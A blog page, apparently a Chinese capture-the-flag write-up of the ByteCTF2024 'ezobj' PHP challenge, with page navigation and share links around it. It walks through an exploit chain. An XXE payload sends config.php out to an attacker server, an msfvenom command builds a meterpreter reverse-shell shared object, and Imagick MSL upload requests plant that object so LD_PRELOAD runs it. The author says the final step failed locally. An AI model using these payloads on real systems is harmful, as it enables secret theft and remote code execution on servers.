@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="写在前面： XXE是靶机出网外带数据的常用手段，本题就是利用了SimpleXMLElement类可以访问远程xml文件进行数据外带的。  在 PHP 中使用 putenv 设置的环境变量（如 LD_PRELOAD）只在当前 PHP 脚本的执行过程中有效。当 PHP 脚本运行结束后，这些环境变量的设置不会影响到其他的进程或以后的脚本执行。 具体来说：  putenv 会为当前进程（即执行PHP脚本的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bytectf2024 ezobj">
+<meta property="og:url" content="http://example.com/2024/10/05/Bytectf2024-ezobj/index.html">
+<meta property="og:site_name" content="K1ato&#39;s blog">
+<meta property="og:description" content="写在前面： XXE是靶机出网外带数据的常用手段，本题就是利用了SimpleXMLElement类可以访问远程xml文件进行数据外带的。  在 PHP 中使用 putenv 设置的环境变量（如 LD_PRELOAD）只在当前 PHP 脚本的执行过程中有效。当 PHP 脚本运行结束后，这些环境变量的设置不会影响到其他的进程或以后的脚本执行。 具体来说：  putenv 会为当前进程（即执行PHP脚本的">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/10/05/Bytectf2024-ezobj/1.PNG">
+<meta property="article:published_time" content="2024-10-05T03:35:46.000Z">
+<meta property="article:modified_time" content="2024-10-07T09:25:01.088Z">
+<meta property="article:author" content="k1ato">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/10/05/Bytectf2024-ezobj/1.PNG">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Bytectf2024 ezobj</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/09/27/%E9%81%97%E5%BF%98%E5%AD%A6%E4%B9%A0-machine-unlearning-%E5%88%9D%E6%8E%A2/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/10/05/Bytectf2024-ezobj/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&text=Bytectf2024 ezobj"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&title=Bytectf2024 ezobj"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&is_video=false&description=Bytectf2024 ezobj"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Bytectf2024 ezobj&body=Check out this article: http://example.com/2024/10/05/Bytectf2024-ezobj/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&title=Bytectf2024 ezobj"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&title=Bytectf2024 ezobj"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&title=Bytectf2024 ezobj"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&title=Bytectf2024 ezobj"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&name=Bytectf2024 ezobj&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/10/05/Bytectf2024-ezobj/&t=Bytectf2024 ezobj"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">写在前面：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">题目源码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-%E5%88%A9%E7%94%A8SimpleXMLElement%E7%B1%BB%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8Bxml%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8Cxxe%E9%80%A0%E6%88%90%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6"><span class="toc-number">5.</span> <span class="toc-text">0x1.利用SimpleXMLElement类访问远程xml文件进行xxe造成数据外带</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E5%88%A9%E7%94%A8Imgick%E7%B1%BB%E8%A7%A3%E6%9E%90msl%E8%84%9A%E6%9C%AC%E5%86%99%E5%85%A5%E6%81%B6%E6%84%8Fso%E5%8F%8Awmv%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">0x2.利用Imgick类解析msl脚本写入恶意so及wmv文件</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Bytectf2024 ezobj
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">k1ato</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-05T03:35:46.000Z" class="dt-published" itemprop="datePublished">2024-10-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h3><ul>
+<li><p>XXE是靶机出网外带数据的常用手段，本题就是利用了SimpleXMLElement类可以访问远程xml文件进行数据外带的。</p>
+</li>
+<li><p>在 PHP 中使用 <code>putenv</code> 设置的环境变量（如 <code>LD_PRELOAD</code>）只在当前 PHP 脚本的执行过程中有效。当 PHP 脚本运行结束后，这些环境变量的设置不会影响到其他的进程或以后的脚本执行。</p>
+<p>具体来说：</p>
+<ul>
+<li><code>putenv</code> 会为当前进程（即执行PHP脚本的进程）设置环境变量。</li>
+<li>此环境变量在该进程的生命周期内有效，直到脚本执行完成。</li>
+<li>一旦脚本执行结束，PHP 进程所设置的环境变量会被清除，不会在系统环境中保留。</li>
+</ul>
+<p>举个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD=/tmp/1.so&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>这个设置只会影响当前脚本的执行。如果你在当前PHP脚本中启动了子进程（如通过exec、shell_exec或system等函数），这些子进程会继承当前PHP进程的环境变量。</p>
+</li>
+</ul>
+<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>1.php有一个扩展叫<code>imagick</code>，该扩展中有个Imagick类，Imagick类在初始化wmv等11种后缀文件时，会调用外部<code>ffmpeg</code>程序，会产生新进程，从而调用上传的恶意so文件里的函数，如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//会调用外部程序ffmpeg，可以劫持</span><br><span class="line">$img=new Imagick(&#x27;aaa.wmv&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>2.在对一个php脚本进行POST请求时，请求体带上一段内容，在php脚本结束之前会将该内容保存到<code>/tmp/php*</code>(文件名的前三个字符是php，后面的字符随机)的临时文件里。本地做个测试：</p>
+<p>web目录下放个include_tmp.php:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">system(&#x27;cat /tmp/php*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>测试结果：</p>
+<img src="/2024/10/05/Bytectf2024-ezobj/1.PNG" class="">
+
+<p>3.Imgick类结合vid、msl写入任意文件</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM (ptsecurity.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://aecous.github.io/2023/06/27/Imagick%E8%A7%A6%E5%8F%91msl/#:~:text=%E5%9C%A8upload%20se">https://aecous.github.io/2023/06/27/Imagick%E8%A7%A6%E5%8F%91msl/#:~:text=%E5%9C%A8upload%20se</a></p>
+<p>因为不支持这种格式的url:<code>msl:http://attacker.com/test.msl:</code>，所以得把msl脚本上传上去。</p>
+<p>传参内容大概长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?byte=imagick&amp;ctf[]=vid:msl:/tmp/php* HTTP/1.1</span><br><span class="line">......</span><br><span class="line">Content-Type: multipart/form-data; boundary=------------------------aaaaaaaa</span><br><span class="line">Content-Length: xxx</span><br><span class="line"></span><br><span class="line">--------------------------aaaaaaaa</span><br><span class="line">Content-Disposition: form-data; name=&quot;swarm&quot;; filename=&quot;swarm.msl&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,base64值&quot; /&gt;</span><br><span class="line"> &lt;write filename=&quot;/tmp/1.so&quot; /&gt;</span><br><span class="line">&lt;/image&gt;</span><br><span class="line">--------------------------aaaaaaaa</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>vid的作用就是使得带通配符的路径名<code>/tmp/php*</code>生效。</p>
+<p>简单解释一下原理，就是在Imagick类的参数中使用vid触发msl脚本使得该msl脚本被解析（可以用通配符），会把 read 标签的内容写如 write 标签中的文件中。</p>
+<h3 id="题目源码："><a href="#题目源码：" class="headerlink" title="题目源码："></a>题目源码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, &quot;On&quot;);</span><br><span class="line">include_once(&quot;config.php&quot;);</span><br><span class="line">if (isset($_GET[&#x27;so&#x27;]) &amp;&amp; isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    if (is_numeric($_GET[&#x27;so&#x27;]) &amp;&amp; $_GET[&#x27;key&#x27;] === $secret) &#123;</span><br><span class="line">        //输出/tmp目录下每一个文件</span><br><span class="line">        array_map(function($file) &#123; echo $file . &quot;\n&quot;; &#125;, glob(&#x27;/tmp/*&#x27;));</span><br><span class="line">        putenv(&quot;LD_PRELOAD=/tmp/&quot;.$_GET[&#x27;so&#x27;].&quot;.so&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;byte&#x27;]) &amp;&amp; isset($_GET[&#x27;ctf&#x27;])) &#123;  </span><br><span class="line">    $a = new ReflectionClass($_GET[&#x27;byte&#x27;]);</span><br><span class="line">    $b = $a-&gt;newInstanceArgs($_GET[&#x27;ctf&#x27;]);</span><br><span class="line">    // echo $b;</span><br><span class="line">&#125; elseif (isset($_GET[&#x27;clean&#x27;]))&#123;</span><br><span class="line">    array_map(&#x27;unlink&#x27;, glob(&#x27;/tmp/*&#x27;));</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo &#x27;Hello ByteCTF2024!&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">// phpinfo.html Hello ByteCTF2024!</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><h3 id="0x1-利用SimpleXMLElement类访问远程xml文件进行xxe造成数据外带"><a href="#0x1-利用SimpleXMLElement类访问远程xml文件进行xxe造成数据外带" class="headerlink" title="0x1.利用SimpleXMLElement类访问远程xml文件进行xxe造成数据外带"></a>0x1.利用SimpleXMLElement类访问远程xml文件进行xxe造成数据外带</h3><p>要想上传恶意so文件，首先要获取config.php中变量$secret的值。</p>
+<p>SimpleXMLElement类的构造方法及各个参数的意义：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/simplexmlelement.construct.php">https://www.php.net/manual/zh/simplexmlelement.construct.php</a></p>
+<p>在vps上放两个恶意xml文件：</p>
+<p>evil.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY[  </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/send.xml&quot;&gt;  </span><br><span class="line">%remote;  </span><br><span class="line">%all;  </span><br><span class="line">%send;  </span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>send.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=config.php&quot;&gt; </span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip/send.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?byte=SimpleXMLElement&amp;ctf[0]=http://ip/evil.xml&amp;ctf[1]=2&amp;ctf[2]=true</span><br></pre></td></tr></table></figure>
+
+<p>这一步拿到了<code>$secret</code>的值。</p>
+<h3 id="0x2-利用Imgick类解析msl脚本写入恶意so及wmv文件"><a href="#0x2-利用Imgick类解析msl脚本写入恶意so及wmv文件" class="headerlink" title="0x2.利用Imgick类解析msl脚本写入恶意so及wmv文件"></a>0x2.利用Imgick类解析msl脚本写入恶意so及wmv文件</h3><p>1.msf生成一个恶意so：（公网上需要有msf）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=ip lport=port -f elf-so &gt; 1.so</span><br><span class="line"></span><br><span class="line">cat 1.so | base64</span><br></pre></td></tr></table></figure>
+
+<p>以下是一个wmv文件的base64值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF8TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtzOjExOiIvdG1wL0FlY291cyI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30=</span><br></pre></td></tr></table></figure>
+
+<p>2.上传恶意so：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /ezobj.php?byte=imagick&amp;ctf[]=vid:msl:/tmp/php* HTTP/1.1</span><br><span class="line">Host: 192.168.225.149</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTrWYaXKoVR1wiLhP</span><br><span class="line">Content-Length: 1059</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryTrWYaXKoVR1wiLhP</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;vulhub.msl&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">  &lt;read filename=&quot;inline:data:text/8BIM;base64,base64值&quot;/&gt;</span><br><span class="line">  &lt;write filename=&quot;/tmp/1.so&quot; /&gt;</span><br><span class="line">&lt;/image&gt;</span><br><span class="line">------WebKitFormBoundaryTrWYaXKoVR1wiLhP--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>上传触发ffpemg命令调用的wmv文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /ezobj.php?byte=imagick&amp;ctf[]=vid:msl:/tmp/php* HTTP/1.1</span><br><span class="line">Host: 192.168.225.149</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng, / ;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeTvfNEmqTayg6bqr</span><br><span class="line">Content-Length: 681</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryeTvfNEmqTayg6bqr</span><br><span class="line">Content-Disposition: form-data; name=&quot;123&quot;; filename=&quot;exesc.msl&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUF8TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtzOjExOiIvdG1wL0FlY291cyI7czo0OiJhcmd2IjtOO3M6NDoiZnVuYyI7TjtzOjU6ImNsYXNzIjtOO30=&quot; /&gt; </span><br><span class="line"> &lt;write filename=&quot;/tmp/aaa.wmv&quot; /&gt;</span><br><span class="line">&lt;/image&gt;</span><br><span class="line">------WebKitFormBoundaryeTvfNEmqTayg6bqr--</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>putenv(&quot;LD_PRELOAD=xxx);</code>，并触发恶意so（注意这两步要在同一次php脚本运行过程中进行）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?byte=Imagick&amp;ctf[]=/tmp/aaa.wmv&amp;so=1&amp;key=HelloByteCTF2024</span><br></pre></td></tr></table></figure>
+
+<p>本地复现时，传参加上<code>vid:</code>服务器就没响应，没打出来，就复现到这里了。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">写在前面：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">题目源码：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">思路：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-%E5%88%A9%E7%94%A8SimpleXMLElement%E7%B1%BB%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8Bxml%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8Cxxe%E9%80%A0%E6%88%90%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6"><span class="toc-number">5.</span> <span class="toc-text">0x1.利用SimpleXMLElement类访问远程xml文件进行xxe造成数据外带</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E5%88%A9%E7%94%A8Imgick%E7%B1%BB%E8%A7%A3%E6%9E%90msl%E8%84%9A%E6%9C%AC%E5%86%99%E5%85%A5%E6%81%B6%E6%84%8Fso%E5%8F%8Awmv%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">0x2.利用Imgick类解析msl脚本写入恶意so及wmv文件</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/10/05/Bytectf2024-ezobj/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&text=Bytectf2024 ezobj"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&title=Bytectf2024 ezobj"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/10/05/Bytectf2024-ezobj/&is_video=false&description=Bytectf2024 ezobj"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Bytectf2024 ezobj&body=Check out this article: http://example.com/2024/10/05/Bytectf2024-ezobj/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
